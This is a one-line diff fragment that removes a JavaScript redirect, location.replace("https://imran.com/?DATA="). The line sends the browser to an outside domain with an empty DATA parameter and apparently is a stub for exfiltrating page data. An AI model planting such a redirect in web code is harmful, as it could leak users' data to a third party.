@@ -1,1 +1,0 @@
-location.replace("https://imran.com/?DATA=")
